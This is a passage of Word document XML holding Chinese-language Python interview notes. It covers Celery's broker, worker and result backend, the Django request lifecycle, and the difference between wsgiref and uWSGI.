          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BEB414" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00024E97">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Woker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>执行完任务后将结果保存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Backend</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140F34D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消息中间件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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消息中间件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>官方提供了很多备选方案，支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>RabbitMQ</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Redis</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Amazon SQS</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MongoDB</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 xml:space="preserve">Memcached </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>等，官方推荐</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>RabbitMQ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266BD4B5"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任务执行单元</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Worker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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Worker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>是任务执行单元，负责从消息队列中取出任务执行，它可以启动一个或者多个，也可以启动在不同的机器节点，这就是其实现分布式的核心。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65EE7C77" w14:textId="5125B943" w:rsidR="00024E97" w:rsidRPr="00077AF1" w:rsidRDefault="00024E97" w:rsidP="00077AF1">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lastRenderedPageBreak/>
        <w:t>结果存储</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Backend</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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Backend</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>结果存储官方也提供了诸多的存储方式支持：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>RabbitMQ</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 xml:space="preserve"> Redis</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Memcached,SQLAlchemy, Django ORM</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Apache Cassandra</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Elasticsearch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:hyperlink r:id="rId43" w:history="1"/>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="01854053" w14:textId="3D95A0B5" w:rsidR="00077AF1" w:rsidRDefault="00077AF1" w:rsidP="00077AF1">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>007</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00724573" w:rsidRPr="00077AF1">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00724573" w:rsidRPr="00077AF1">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请求生命周期</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
      <w:r w:rsidR="00724573" w:rsidRPr="00077AF1">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00724573">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00724573">
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F91C7E" w14:textId="7D1DF677" w:rsidR="00724573" w:rsidRDefault="00724573" w:rsidP="00724573">
      <w:r>
        <w:t>答：讲了一下生命周期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D7F24A" w14:textId="7D0EA2F8" w:rsidR="00077AF1" w:rsidRDefault="00077AF1" w:rsidP="00077AF1">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>008</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00724573" w:rsidRPr="00077AF1">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wsgiref</w:t>
      </w:r>
      <w:r w:rsidR="00724573" w:rsidRPr="00077AF1">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00724573" w:rsidRPr="00077AF1">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r w:rsidR="00724573" w:rsidRPr="00077AF1">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C7141E" w14:textId="3043170C" w:rsidR="00724573" w:rsidRDefault="00724573" w:rsidP="00724573">
      <w:r>
        <w:t>答：并发量不同</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1575B7DA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00724573" w:rsidP="00C045E4">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C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wsgiref</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>则是官方给出的一个实现了</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>标准用于演示用的简单</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>内置库，它实现了一个简单的</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI Server</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI Application</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>（在</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>simple_server</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>模块中），主要分为五个模块：</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>simple_server</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> util</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> headers</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> handlers</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> validate</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。本质上就是编写一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务端，用于接收用户请求</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(django)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。（</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架实现服务端与客户端的通信</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>基于</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wsgiref)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205BB6F7" w14:textId="51DFE58A" w:rsidR="00724573" w:rsidRPr="00C045E4" w:rsidRDefault="00724573" w:rsidP="00C045E4">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C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wsgiref</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>源码地址：</w:t>
      </w:r>
      <w:hyperlink r:id="rId44" w:history="1">
        <w:r w:rsidRPr="00C045E4">
          <w:rPr>
            <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:sz w:val="22"/>
          </w:rPr>
          <w:t>https://pypi.python.org/pypi/wsgiref</w:t>
        </w:r>
      </w:hyperlink>
      <w:bookmarkStart w:id="51" w:name="_label0_1"/>
      <w:bookmarkEnd w:id="51"/>
    </w:p>
    <w:p w14:paraId="7986E324" w14:textId="77777777" w:rsidR="00724573" w:rsidRPr="00C045E4" w:rsidRDefault="00724573" w:rsidP="00C045E4">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C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">werkzeug </w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>不是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="00C045E4">
        <w:rPr>
